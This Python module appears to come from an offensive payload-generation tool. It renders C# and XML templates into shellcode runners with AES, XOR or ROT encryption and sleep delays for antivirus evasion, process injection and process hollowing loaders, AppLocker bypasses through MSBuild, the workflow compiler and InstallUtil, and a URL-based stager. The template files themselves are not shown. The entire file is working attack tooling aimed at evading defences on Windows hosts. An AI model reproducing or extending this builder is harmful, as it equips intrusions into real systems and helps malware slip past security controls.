import os
from .utils import *

path = os.path.dirname(__file__)

def bytes_to_cs(data):
    hex_bytes = [f'0x{b:02X}' for b in data]
    return '{' + ', '.join(hex_bytes) + '}'

def delay(code, time):
    if (time):
        return render(code, delay=time)
    else:
        return code

def encrypt(code, enc, key, iv):
    if enc:
        if enc.upper() == 'AES':
            return render(code, key=bytes_to_cs(key), iv=bytes_to_cs(iv))
        elif enc.upper() == 'XOR' or enc.upper() == 'ROT':
            return render(code, key=hex(key),)
    else:
        return code

def av_bypass(shellcode, enc, key, iv, time):
    with open(os.path.join(path, 'templates/cs/av_bypass.cs'), 'r') as f:
        code = f.read()
    code = encrypt(code, enc, key, iv)
    code = delay(code, time)
    return render(code, shellcode=bytes_to_cs(shellcode))

def shellcode_runner(shellcode, enc, key, iv, time):
    with open(os.path.join(path, 'templates/cs/shellcode_runner.cs'), 'r') as f:
        code = f.read()
    payload = av_bypass(shellcode, enc, key, iv, time)
    return render(code, payload=payload)

def process_injection(shellcode, enc, key, iv, time, process, arch):
    with open(os.path.join(path, 'templates/cs/process_injection.cs'), 'r') as f:
        code = f.read()
    payload = av_bypass(shellcode, enc, key, iv, time)
    process_name = os.path.splitext(os.path.basename(process.replace('\\','/')))[0]
    iswow64 = str(arch=='x32').lower()
    return render(code, payload=payload, process=process_name, iswow64=iswow64)

def process_hollowing(shellcode, enc, key, iv, time, process, arch):
    with open(os.path.join(path, 'templates/cs/process_hollowing.cs'), 'r') as f:
        code = f.read()
    payload = av_bypass(shellcode, enc, key, iv, time)
    if arch == 'x32' and not '\\' in process and not '/' in process:
        process = 'C:\\Windows\\SysWow64\\' + process
    process = process.replace('/', '\\').replace('\\', '\\\\')
    iswow64 = str(arch=='x32').lower()
    return render(code, payload=payload, process=process, iswow64=iswow64)

def applocker_bypass(applocker, applocker_path, name, url):
    xml_code=''
    cs_code=''
    if applocker == 'msbuild':
        with open(os.path.join(path, 'templates/xml/msbuild.xml'), 'r') as f:
            xml_code = f.read()
    if applocker == 'workflow_compiler':
        with open(os.path.join(path, 'templates/cs/workflow_compiler.cs'), 'r') as f:
            cs_code = f.read()
        with open(os.path.join(path, 'templates/xml/workflow_compiler.xml'), 'r') as f:
            xml_code = f.read()

    if applocker == 'installutil':
        with open(os.path.join(path, 'templates/cs/installutil.cs'), 'r') as f:
            cs_code = f.read()
    
    return render(cs_code, url=url), render(xml_code, url=url, path=applocker_path+'\\'+name+'.cs')

def stager(url, enc, key, iv):
    with open(os.path.join(path, 'templates/cs/stager.cs'), 'r') as f:
        code = f.read()
        code = encrypt(code, enc, key, iv)
    return render(code, url=url)